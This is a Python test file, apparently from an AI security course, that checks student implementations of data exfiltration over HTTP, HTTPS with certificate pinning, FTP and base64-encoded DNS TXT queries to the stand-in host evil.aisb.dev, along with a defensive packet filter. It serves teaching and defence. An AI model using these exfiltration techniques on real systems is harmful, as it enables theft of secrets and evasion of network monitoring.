# Allow imports from parent directory
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))

import requests
import dns.resolver as dns_resolver
from unittest.mock import patch, MagicMock
import base64



def test_make_evil_request(make_evil_request):
    """Test the make_evil_request function."""
    print("Testing make_evil_request...")

    # Test 1: Successful request
    with patch("requests.get") as mock_get:
        # Mock a successful response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "Data received by C2 server"
        mock_get.return_value = mock_response

        result = make_evil_request("sensitive_api_key_12345")

        # Verify the request was made correctly
        mock_get.assert_called_once()
        args, kwargs = mock_get.call_args

        assert args[0] == "http://evil.aisb.dev/exfiltrate", "URL should be correct"
        assert kwargs.get("params") == {"data": "sensitive_api_key_12345"}, "Query parameters should be correct"
        assert kwargs.get("timeout") == 5, "Timeout should be set to 5 seconds"
        assert result == "Data received by C2 server", "Should return response text"

        print("✓ Successful request test passed")

    # Test 2: Failed request (non-200 status)
    with patch("requests.get") as mock_get:
        mock_response = MagicMock()
        mock_response.status_code = 403
        mock_get.return_value = mock_response

        result = make_evil_request("blocked_data")
        assert result is None, "Should return None for non-200 status"
        print("✓ Failed request test passed")

    # Test 3: Network exception
    with patch("requests.get") as mock_get:
        mock_get.side_effect = requests.exceptions.ConnectionError("Network error")

        result = make_evil_request("unreachable_data")
        assert result is None, "Should return None on network error"
        print("✓ Network exception test passed")

    print("✓ All tests for make_evil_request passed!\n" + "=" * 60)




def test_make_evil_request_https(make_evil_request_https):
    """Test the HTTPS request function."""
    print("Testing make_evil_request_https...")

    # Test 1: Successful HTTPS request
    with patch("requests.get") as mock_get:
        # Mock a successful HTTPS response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "Encrypted data received"
        mock_get.return_value = mock_response

        result = make_evil_request_https("encrypted_secret_123")

        # Verify the request was made correctly
        mock_get.assert_called_once()
        args, kwargs = mock_get.call_args

        assert args[0] == "https://evil.aisb.dev/exfiltrate", "URL should use HTTPS"
        assert kwargs.get("params") == {"data": "encrypted_secret_123"}, "Query parameters should be correct"
        assert result == "Encrypted data received", "Should return response text"

        print("✓ Successful HTTPS request test passed")

    # Test 2: Request without certificate verification
    with patch("requests.get") as mock_get:
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "Success without cert check"
        mock_get.return_value = mock_response

        result = make_evil_request_https("unverified_data")

        _, kwargs = mock_get.call_args
        assert result == "Success without cert check", "Should succeed without cert verification"

        print("✓ Unverified certificate test passed")

    # Test 3: SSL certificate error
    with patch("requests.get") as mock_get:
        mock_get.side_effect = requests.exceptions.SSLError("Certificate verification failed")

        result = make_evil_request_https("ssl_error_data")
        assert result is None, "Should return None on SSL error"
        print("✓ SSL error handling test passed")

    # Test 4: Comparing with HTTP version
    print("\n📊 Comparing HTTP vs HTTPS visibility:")
    print("  HTTP:  Defender sees: GET /exfiltrate?data=secret_123")
    print("  HTTPS: Defender sees: [ENCRYPTED TLS TRAFFIC to evil.aisb.dev:443]")

    print("\n✓ All tests for make_evil_request_https passed!\n" + "=" * 60)




def test_make_evil_request_pinned(make_evil_request_pinned):
    """Test the certificate pinning implementation."""
    print("Testing make_evil_request_pinned...")

    # Test 1: Successful request with correct certificate
    with patch("requests.get") as mock_get:
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "Pinned connection successful"
        mock_get.return_value = mock_response

        result = make_evil_request_pinned("pinned_secret_456")

        # Verify the request was made with certificate pinning
        mock_get.assert_called_once()
        args, kwargs = mock_get.call_args

        assert args[0] == "https://evil.aisb.dev/exfiltrate", "URL should use HTTPS"
        assert kwargs.get("params") == {"data": "pinned_secret_456"}, "Query parameters should be correct"
        assert kwargs.get("verify") == "isrg-root-x1.pem", "Should use certificate pinning"
        assert result == "Pinned connection successful", "Should return response text"

        print("✓ Successful pinned request test passed")

    # Test 2: MITM attack with different certificate
    with patch("requests.get") as mock_get:
        # Simulate SSL error from certificate mismatch
        mock_get.side_effect = requests.exceptions.SSLError(
            "certificate verify failed: self signed certificate in certificate chain"
        )

        result = make_evil_request_pinned("mitm_blocked_data")
        assert result is None, "Should return None when certificate doesn't match"
        print("✓ MITM detection test passed")

    # Test 3: Missing certificate file
    with patch("requests.get") as mock_get:
        mock_get.side_effect = FileNotFoundError("isrg-root-x1.pem not found")

        result = make_evil_request_pinned("no_cert_data")
        assert result is None, "Should return None when certificate file is missing"
        print("✓ Missing certificate file test passed")

    # Test 4: Server error despite correct certificate
    with patch("requests.get") as mock_get:
        mock_response = MagicMock()
        mock_response.status_code = 500
        mock_get.return_value = mock_response

        result = make_evil_request_pinned("server_error_data")
        assert result is None, "Should return None on server error"
        print("✓ Server error handling test passed")

    print("\n✓ All tests for make_evil_request_pinned passed!\n" + "=" * 60)




def test_make_evil_request_ftp(make_evil_request_ftp):
    """Test the FTP request function."""
    print("Testing make_evil_request_ftp...")

    # Test 1: Successful FTP request
    with patch("ftplib.FTP") as mock_ftp:
        mock_instance = mock_ftp.return_value
        mock_instance.nlst.return_value = ["file1.txt", "file2.txt"]

        result = make_evil_request_ftp("ftp_secret_data")

        # Verify the FTP connection and data retrieval
        mock_ftp.assert_called_once_with("ftp.scene.org", timeout=5)
        mock_instance.login.assert_called_once()
        assert result == "['file1.txt', 'file2.txt']", "Should return list of files as string"

        print("✓ Successful FTP request test passed")

    # Test 2: FTP connection error
    with patch("ftplib.FTP") as mock_ftp:
        mock_ftp.side_effect = Exception("FTP connection failed")

        result = make_evil_request_ftp("connection_error_data")
        assert result is None, "Should return None on FTP connection error"
        print("✓ FTP connection error test passed")

    print("\n✓ All tests for make_evil_request_ftp passed!\n" + "=" * 60)




def test_packet_processor(process_packet_func):
    """Test the packet processing logic using mocks."""
    print("Testing packet processor...")
    from unittest.mock import Mock, patch

    try:
        from scapy.all import IP, TCP, UDP, Raw
    except ImportError:
        print("!! Scapy not installed. Skipping packet processor tests. !!")
        return

    # Test 1: Packet to first blocked IP should be dropped
    mock_packet = Mock()
    mock_packet.get_payload.return_value = bytes(IP(dst="49.12.34.32") / TCP(dport=21) / Raw(b"FTP traffic"))

    process_packet_func(mock_packet)

    mock_packet.drop.assert_called_once()
    mock_packet.accept.assert_not_called()
    print("✓ Blocked IP 49.12.34.32 correctly dropped")

    # Test 2: Packet to second blocked IP should be dropped
    mock_packet2 = Mock()
    mock_packet2.get_payload.return_value = bytes(IP(dst="85.188.1.133") / TCP(dport=443) / Raw(b"HTTPS traffic"))

    process_packet_func(mock_packet2)

    mock_packet2.drop.assert_called_once()
    mock_packet2.accept.assert_not_called()
    print("✓ Blocked IP 85.188.1.133 correctly dropped")

    # Test 3: Packet to allowed IP should be accepted
    mock_packet3 = Mock()
    mock_packet3.get_payload.return_value = bytes(IP(dst="8.8.8.8") / TCP(dport=443) / Raw(b"HTTPS traffic"))

    process_packet_func(mock_packet3)

    mock_packet3.accept.assert_called_once()
    mock_packet3.drop.assert_not_called()
    print("✓ Allowed IP correctly accepted")

    # Test 4: Error during packet parsing should drop packet
    mock_packet5 = Mock()
    mock_packet5.get_payload.side_effect = Exception("Simulated parsing error")

    process_packet_func(mock_packet5)

    mock_packet5.drop.assert_called_once()
    mock_packet5.accept.assert_not_called()
    print("✓ Exception correctly drops packet")

    print("\n✓ All packet processor tests passed!\n" + "=" * 60)




def test_make_evil_request_dns(make_evil_request_dns, resolver):
    """Test the DNS exfiltration implementation."""
    print("Testing make_evil_request_dns...")

    # We'll use mocking since we can't actually query evil.aisb.dev
    from unittest.mock import patch, MagicMock

    # Test 1: Successful DNS exfiltration
    with patch.object(resolver, "resolve") as mock_resolve:
        # Create mock DNS response
        mock_answer = MagicMock()
        mock_answer.to_text.return_value = "Command: Download payload.exe"
        mock_resolve.return_value = [mock_answer]

        result = make_evil_request_dns("secret_password_123")

        # Verify the DNS query was made correctly
        mock_resolve.assert_called_once()
        args = mock_resolve.call_args[0]
        domain = args[0]
        record_type = args[1]

        # Check that data was encoded properly
        expected_encoded = base64.urlsafe_b64encode("secret_password_123".encode()).decode()
        expected_domain = f"{expected_encoded}.evil.aisb.dev"

        assert domain == expected_domain, f"Domain should be {expected_domain}, got {domain}"
        assert record_type == "TXT", "Should query for TXT records"
        assert result == "Command: Download payload.exe", f"Should return TXT record content, got {result}"

        print("✓ Successful DNS exfiltration test passed")

    # Test 2: Domain does not exist (NXDOMAIN)
    with patch.object(resolver, "resolve") as mock_resolve:
        mock_resolve.side_effect = dns_resolver.NXDOMAIN()

        result = make_evil_request_dns("nonexistent_data")
        assert result is None, "Should return None for NXDOMAIN"
        print("✓ NXDOMAIN handling test passed")

    # Test 3: No TXT records (NoAnswer)
    with patch.object(resolver, "resolve") as mock_resolve:
        mock_resolve.side_effect = dns_resolver.NoAnswer()

        result = make_evil_request_dns("no_txt_data")
        assert result is None, "Should return None when no TXT records exist"
        print("✓ NoAnswer handling test passed")

    # Test 4: DNS timeout
    with patch.object(resolver, "resolve") as mock_resolve:
        mock_resolve.side_effect = dns_resolver.Timeout()

        result = make_evil_request_dns("timeout_data")
        assert result is None, "Should return None on timeout"
        print("✓ Timeout handling test passed")

    # Test 5: Encoding edge cases
    with patch.object(resolver, "resolve") as mock_resolve:
        mock_answer = MagicMock()
        mock_answer.to_text.return_value = '"Success"'
        mock_resolve.return_value = [mock_answer]

        # Test with special characters that need encoding
        result = make_evil_request_dns("user@example.com/password!")

        # Verify proper encoding
        args = mock_resolve.call_args[0]
        domain = args[0]

        # The subdomain should not contain invalid DNS characters
        subdomain = domain.split(".")[0]
        assert "@" not in subdomain, "@ should be encoded"
        assert "/" not in subdomain, "/ should be encoded"
        assert "!" not in subdomain, "! should be encoded"

        print("✓ Special character encoding test passed")

    # Test 6: Empty response handling
    with patch.object(resolver, "resolve") as mock_resolve:
        mock_resolve.return_value = []  # Empty answer list

        result = make_evil_request_dns("empty_response")
        assert result is None, "Should return None for empty response"
        print("✓ Empty response handling test passed")

    print("\n✓ All tests for make_evil_request_dns passed!\n" + "=" * 60)
